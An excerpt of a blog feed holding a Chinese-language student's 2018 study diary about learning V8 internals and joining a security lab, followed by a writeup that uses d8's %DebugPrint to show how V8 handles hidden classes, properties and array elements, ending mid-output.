title="2018-5-3"></a>2018-5-3</h2><ol><li>下午在看书，然后突然接了玄武的面试，患得患失吧，之前面试都没这种感觉，可能是因为，玄武是我从刚学二进制，就一直梦想能去的地方。</li><li>总结一下面试：<br>CTF和内核这种充数的不算，好歹面的是浏览器组。<br>主要是讲了v8的一个洞，然后oob有一个点没分析清楚，我需要透彻的再搞一下了，还是太菜。<br>感谢给我讲了这个点的sky师傅，面的时候被问到这里真心紧张了。<br>面了45分钟，口干舌燥，最后我提问的时候，问了自己读浏览器源码的方法是否合适，万分期望能过。<br>也问了我对各种缓解机制的了解，然后就是漏洞利用，我讲的每一个洞，都被问了怎么利用，这个答的太差了，真的只是说说思路了，自己搞，写exp，真的没试过……该提升这方面的技能了，不能停滞不前！</li><li>CTF暂时不玩了，在拿到offer之前。</li></ol><h2 id="2018-5-4"><a href="#2018-5-4" class="headerlink" title="2018-5-4"></a>2018-5-4</h2><ol><li>webkit技术内幕里关于v8有一些描述，有一些帮助。</li><li>理解了一下原型链是什么。</li></ol><h2 id="2018-5-5-9"><a href="#2018-5-5-9" class="headerlink" title="2018-5-5-9"></a>2018-5-5-9</h2><ol><li>有点忘了自己都做了什么？最近做的东西周期越来越长，分开来看每天都没什么好记的（都是借口……最近太兴奋和激动有点摸鱼）</li><li>玄武实验室的offer拿到了~我最初想要的都有了，以后只需要往着安全研究员和优秀黑客的方向继续努力就行。</li><li>最近有在翻v8的一些日语资料，翻完了会放出来吧，一边看资料一边查资料读slide打基础，还有鲸书准备读。</li></ol><h2 id="2018-5-10"><a href="#2018-5-10" class="headerlink" title="2018-5-10"></a>2018-5-10</h2><ol><li>继续翻v8 exploit的资料，大概翻完了1/3，看到了GC机制那里。</li><li>下午上机组实验太伤脑子了……茶，然后最近准备再调一个v8的oob写wp了，不过还得等等…一样一样来。</li><li>c++有点不熟了呀，还是要再搞搞……</li></ol><h2 id="2018-5-11"><a href="#2018-5-11" class="headerlink" title="2018-5-11"></a>2018-5-11</h2><ol><li>继续翻v8资料，理解引擎很重要，在此基础上调洞比起靠感觉还是要好点的，纯靠感觉容易偏。</li><li>翻完了gc，好像稍微懂一点了。</li><li>今天其实发生了很多事情吧，不过不方便写在日记里，就这样吧。</li></ol><h2 id="2018-5-12"><a href="#2018-5-12" class="headerlink" title="2018-5-12"></a>2018-5-12</h2><ol><li>继续翻v8，总算翻到了对象存储（其实这部分该最先讲吧……）</li><li>准备信息系统开发的答辩什么的，下周开始要准备复习功课了。</li></ol><h2 id="2018-5-13-14"><a href="#2018-5-13-14" class="headerlink" title="2018-5-13-14"></a>2018-5-13-14</h2><ol><li>今天把v8的ppt的引擎基础部分翻完了，入职的事情也都搞的差不多了，剩下就是在去之前好好努力了。</li><li>感觉路由器这种硬件可以玩玩……相对好挖洞呢。。</li></ol><h2 id="2018-5-15-6-9"><a href="#2018-5-15-6-9" class="headerlink" title="2018-5-15-6-9"></a>2018-5-15-6-9</h2><p>这段时间沉迷期末考试无法自拔？？？嘤嘤嘤<br>有个小插曲，因为弄错了考试时间导致挂科，吃一堑长一智。。回去我就把那个误导我的垃圾学校app日了。。<br>好了，开始记笔记了。</p><h2 id="2018-6-10-11"><a href="#2018-6-10-11" class="headerlink" title="2018-6-10-11"></a>2018-6-10-11</h2><p>把v8 exploit的PPT翻译收了个尾，重新整理了下v8的学习思路。<br>从漏洞函数回溯调用路径，断点调试等，还有exp的常用思路。</p><h2 id="2018-6-12-14"><a href="#2018-6-12-14" class="headerlink" title="2018-6-12-14"></a>2018-6-12-14</h2><p>最近脚上起了个小疮去了两趟医院，走路还好疼，真的是非常不顺利了。</p><h2 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018-6-15"></a>2018-6-15</h2><p>在mac上编译了v8，之前是在win上编译的，不得不说……有个坑点就是在16.04上面，不checkout到旧的分支，是无法编译成功的，耽误了一天。<br>然后认真的研究了一下fast Properties和hidden class，拿gdb打debugprint看了很多东西学习，记笔记记笔记。</p><h2 id="2018-6-16"><a href="#2018-6-16" class="headerlink" title="2018-6-16"></a>2018-6-16</h2><p>翻译了Source to Binary Jounrney of V8 javascript engine<br>categories，get了新知识，v8的体系结构还要多调试理解。<br>另外，再需要啃一本鲸书，理解一下编译优化技术。</p><h2 id="2018-6-17"><a href="#2018-6-17" class="headerlink" title="2018-6-17"></a>2018-6-17</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-180229.png" alt="">积累着读了一点PPT<br>突然发现也已经看了和写了，还调试了不少东西了，慢慢的对v8从生疏到开始渐渐熟悉，不过到挖掘漏洞的方法论可能还要再过一段时间吧。<br>毕竟v8代码我都没咋读过，翻翻pipeline.cc了解下Turbofan的一些API</p><h2 id="2018-6-18"><a href="#2018-6-18" class="headerlink" title="2018-6-18"></a>2018-6-18</h2><p>饮鸩止渴的谈恋爱。<br>学习了阅读v8的bytecode，和了解bytecode的生成和解释执行还有to graph的过程</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;2018-1-28&quot;&gt;&lt;a href=&quot;#2018-1-28&quot; class=&quot;headerlink&quot; title=&quot;2018-1-28&quot;&gt;&lt;/a&gt;2018-1-28&lt;/h2&gt;&lt;p&gt;1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）&lt;br&gt;2
      
    
    </summary>
    
      <category term="学习日记" scheme="http://eternalsakura13.com/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="sakuraのsakura" scheme="http://eternalsakura13.com/tags/sakura%E3%81%AEsakura/"/>
    
  </entry>
  
  <entry>
    <title>v8 debug writeup</title>
    <link href="http://eternalsakura13.com/2018/06/18/v81/"/>
    <id>http://eternalsakura13.com/2018/06/18/v81/</id>
    <published>2018-06-18T14:54:11.123Z</published>
    <updated>2018-06-18T16:03:16.937Z</updated>
    
    <content type="html"><![CDATA[<h2 id="v8-hidden-class-test"><a href="#v8-hidden-class-test" class="headerlink" title="v8 hidden class test"></a>v8 hidden class test</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Point(<span class="number">12</span>, <span class="number">13</span>);</span><br><span class="line">%DebugPrint(p2)</span><br></pre></td></tr></table></figure><p><code>./d8 --allow_natives_syntax test_hidden_class.js</code><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-14-131739.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x27984250c879: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f829&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x27984250c969: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f931&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure><p>结论：相同的map值</p><h4 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h4><p>add p2.z = 14;<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-074842.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x252f4f50c891: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f829&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f989 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line">    #z: 14 (data field 2)</span><br><span class="line"> &#125;</span><br><span class="line"> 0x2d1249b8f989: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 7</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f8d9 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #3: 0x252f4f50ca51 &lt;FixedArray[11]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure></p><p>结论：指向一个新的map</p><h3 id="property的管理方法"><a href="#property的管理方法" class="headerlink" title="property的管理方法"></a>property的管理方法</h3><h4 id="In-Object-Properties"><a href="#In-Object-Properties" class="headerlink" title="In-Object Properties"></a>In-Object Properties</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-144639.png" alt="">V8支持所谓的对象内属性，它们被直接保存在对象上，和对象在同一块内存区域。这种属性是V8中速度最快的属性，能够被直接访问。对象内属性的个数由对象初始化大小决定。如果要添加的属性超出对象的大小，这些属性就会被放入properties store中。properties store会增加一层属性访问的消耗，但是不受大小的限制。 </p><h4 id="Fast-Properties"><a href="#Fast-Properties" class="headerlink" title="Fast Properties"></a>Fast Properties</h4><p>一般来说，我们会把属性保存在线性的properties store中，作为快速属性。快速属性可以通过简单的索引在properties store中访问。不过为了从属性名从properties store获取实际位置，我们要去HiddenClass上的 descriptor array中查询 。具体来讲，这一步骤是先根据属性名搜寻隐藏类的descriptor array，然后得到到数组的偏移地址，然后根据偏移地址到properties store上读取属性信息。实际上，第一次查找属性的时候难免会经历一次隐藏类的哈希查找，但下次一般会结合内联缓存，直接采用缓存的位移来存取属性。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-080119.jpg" alt=""></p><h4 id="Slow-Properties"><a href="#Slow-Properties" class="headerlink" title="Slow Properties"></a>Slow Properties</h4><p>  然而，若是有很多属性从对象上添加或者删除，就需要花费很多时间和内存来维护descriptor array以及隐藏类。因此，V8也支持所谓的慢属性。拥有慢属性的对象会拥有一个自给的字典作为它的properties store（如上图所示）。这种情况下，所有属性的元信息不再储存在隐藏类的descriptor array中，而是直接保存在属性字典上。因此，此时属性的添加和移除不用再去更新指向的隐藏类。因为内联缓存不适用保存在字典中的属性，所以慢属性一般要比快属性慢。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-080209.jpg" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>列表内容有三种不同类型的命名属性：对象内属性，快属性，以及慢/字典属性。<br>  1. 对象内属性直接储存在对象自身上，提供最快的属性访问。<br>  2. 快属性活跃在properties store上，所有相关的元信息都在隐藏类的descriptor array中。<br>  3. 慢属性保存在一个自给的属性字典上，属性的元信息不再与隐藏类有关。<br>慢属性提供高效的属性添加删除，但是访问速度要慢于快速属性和对象内对象。</p><h2 id="Elements-or-array-indexed-Properties"><a href="#Elements-or-array-indexed-Properties" class="headerlink" title="Elements or array-indexed Properties"></a>Elements or array-indexed Properties</h2><p>  目前为止我们介绍了命名属性并且忽略了通常出现在数组中的整数索引属性。处理这种整数型属性要比命名属性简单很多。<br>所有的整数型属性都被单独保存在一个elements store中，并且有多达20种元素类型。</p><h3 id="Packed-or-Holey-Elements"><a href="#Packed-or-Holey-Elements" class="headerlink" title="Packed or Holey Elements"></a>Packed or Holey Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "b".</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line"><span class="keyword">delete</span> o[<span class="number">1</span>];                <span class="comment">// Introduces a hole in the elements store.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "undefined"; property 1 does not exist.</span></span><br><span class="line">o.__proto__ = &#123;<span class="number">1</span>: <span class="string">"B"</span>&#125;;     <span class="comment">// Define property 1 on the prototype.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">0</span>]);          <span class="comment">// Prints "a".</span></span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "B".</span></span><br><span class="line">print(o[<span class="number">2</span>]);          <span class="comment">// Prints "c".</span></span><br><span class="line">print(o[<span class="number">3</span>]);          <span class="comment">// Prints undefined</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">b</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503b71 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; [FAST_ELEMENTS (COW)]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b408191 &lt;String[1]: b&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503b71: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x236e9503d29 &lt;Map(FAST_HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - transitions #1: 0x92dae108a81 &lt;TransitionArray[5]&gt;</span><br><span class="line">     0x31013b404069 &lt;Symbol: elements_transition_symbol&gt;: (transition to FAST_HOLEY_ELEMENTS) -&gt; 0x236e9503e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503e31 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503e31: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x236e9503b71 &lt;Map(FAST_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 